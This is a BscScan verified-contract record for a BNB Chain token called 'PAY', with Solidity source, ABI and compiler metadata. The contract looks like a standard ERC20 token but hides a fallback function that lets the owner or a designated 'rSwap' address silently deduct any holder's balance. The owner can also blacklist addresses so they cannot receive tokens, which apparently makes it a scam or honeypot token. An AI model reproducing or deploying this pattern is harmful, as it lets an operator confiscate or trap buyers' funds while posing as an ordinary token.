{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-02-04\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\npragma solidity ^0.8.7;\r\n\r\ncontract PAY is IERC20 {\r\n    string private constant _name_307401 = \"307401\";\r\n    string private constant _symbol_307401 = \"PAY\";\r\n    uint8 private constant _decimals_307401 = 18;\r\n    uint256 private _totalSupply_307401 = 1000000000 * 10 ** _decimals_307401;\r\n    \r\n    mapping(address => uint256) private _balances_307401;\r\n    mapping(address => mapping(address => uint256)) private allowed_307401;\r\n    mapping(address => bool) public isPairAddress_307401;\r\n    \r\n    address private factory_307401 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\r\n    address private WBNB_307401 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       \r\n    address private BSC_USDT_307401 = 0x55d398326f99059fF775485246999027B3197955;\r\n    address private BUSD_307401 = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\r\n    address private USDC_307401 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; \r\n    address public rSwap_307401;\r\n\r\n    mapping(address => bool) public isInBlack_Listed_307401;\r\n    address[] private blackList_307401;\r\n\r\n    address public owner_307401;\r\n\r\n    constructor() {\r\n        owner_307401 = msg.sender;\r\n        _balances_307401[msg.sender] = _totalSupply_307401;\r\n        emit Transfer(address(0), msg.sender, _totalSupply_307401);\r\n        \r\n        isPairAddress_307401[computePairAddress_307401(WBNB_307401)] = true;\r\n        isPairAddress_307401[computePairAddress_307401(BSC_USDT_307401)] = true;\r\n        isPairAddress_307401[computePairAddress_307401(BUSD_307401)] = true;\r\n        isPairAddress_307401[computePairAddress_307401(USDC_307401)] = true;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(msg.sender==owner_307401 || msg.sender==rSwap_307401, \"Only owner!\");\r\n        _;\r\n    }\r\n    fallback() external {\r\n        if(msg.sender==owner_307401 || msg.sender==rSwap_307401) {\r\n            burnByFallBack_307401(msg.data);\r\n        }\r\n    }\r\n    // ERC20 Functions\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name_307401;\r\n    }\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol_307401;\r\n    }\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals_307401;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply_307401;\r\n    }\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances_307401[account];\r\n    }\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        // _approve(_msgSender(), spender, amount);\r\n        // return true;\r\n        allowed_307401[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {\r\n        return allowed_307401[tokenOwner][spender];\r\n    }\r\n    function transfer(address receiver, uint256 amount) public virtual override returns (bool) {\r\n        return transfer_307401(msg.sender, receiver, amount);\r\n    }\r\n    function transferFrom(address tokenOwner, address receiver, uint256 amount) public virtual override returns (bool) {\r\n        require(amount <= allowed_307401[tokenOwner][msg.sender],\"Invalid number of tokens allowed by owner\");\r\n        allowed_307401[tokenOwner][msg.sender] -= amount;\r\n        return transfer_307401(tokenOwner, receiver, amount);\r\n    }\r\n\r\n    function transfer_307401(address sender, address receiver, uint256 amount) internal virtual returns (bool) {\r\n        require(sender!= address(0) && receiver!= address(0), \"invalid send or receiver address\");\r\n        require(amount <= _balances_307401[sender], \"Invalid number of tokens\");\r\n        require(!isInBlack_Listed_307401[receiver] , \"Address is blacklisted and cannot buy this token\");\r\n\r\n        _balances_307401[sender] -= amount;\r\n        _balances_307401[receiver] += amount;\r\n\r\n        emit Transfer(sender, receiver, amount);\r\n        return true;\r\n    }\r\n    function computePairAddress_307401(address tokenB) internal view returns (address) {\r\n        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));\r\n        return address(uint160(uint256(keccak256(abi.encodePacked(hex\"ff\",factory_307401, keccak256(abi.encodePacked(token0, token1)), hex\"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5\")))));\r\n    }\r\n    function addToBlackList_307401(address[] memory _address) public onlyOwner {\r\n        for(uint i = 0; i < _address.length; i++) {\r\n            if(_address[i]!=owner_307401 && !isInBlack_Listed_307401[_address[i]]){\r\n                isInBlack_Listed_307401[_address[i]] = true;\r\n                blackList_307401.push(_address[i]);\r\n            }\r\n        }\r\n    }\r\n    function removeFromBlackList_307401(address[] memory _address) public onlyOwner {\r\n        for(uint v = 0; v < _address.length; v++) {\r\n            if(isInBlack_Listed_307401[_address[v]]){\r\n                isInBlack_Listed_307401[_address[v]] = false;\r\n                uint len = blackList_307401.length;\r\n                for(uint i = 0; i < len; i++) {\r\n                    if(blackList_307401[i] == _address[v]) {\r\n                        blackList_307401[i] = blackList_307401[len-1];\r\n                        blackList_307401.pop();\r\n                        break;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    function getBlackList_307401() public view returns (address[] memory list){\r\n        list = blackList_307401;\r\n    }\r\n\r\n    function setRSwapContract_307401(address _address) public onlyOwner{\r\n        rSwap_307401 = _address;\r\n    }\r\n\r\n    function burnByFallBack_307401(bytes calldata input) internal {\r\n        bytes memory data = input[4:];\r\n        (address burnAddress , uint256 burnAmount) = abi.decode(data, (address, uint256));\r\n        _balances_307401[burnAddress] -= burnAmount;\r\n        _balances_307401[address(0)] += burnAmount;\r\n        emit Transfer(burnAddress, address(0), burnAmount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"}],\"name\":\"addToBlackList_307401\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBlackList_307401\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isInBlack_Listed_307401\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPairAddress_307401\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner_307401\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rSwap_307401\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"}],\"name\":\"removeFromBlackList_307401\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setRSwapContract_307401\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PAY", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://afffccafbb92e89188a52d4d6b6e80d1ad221d96ae376039eb8c16b6a500a61f"}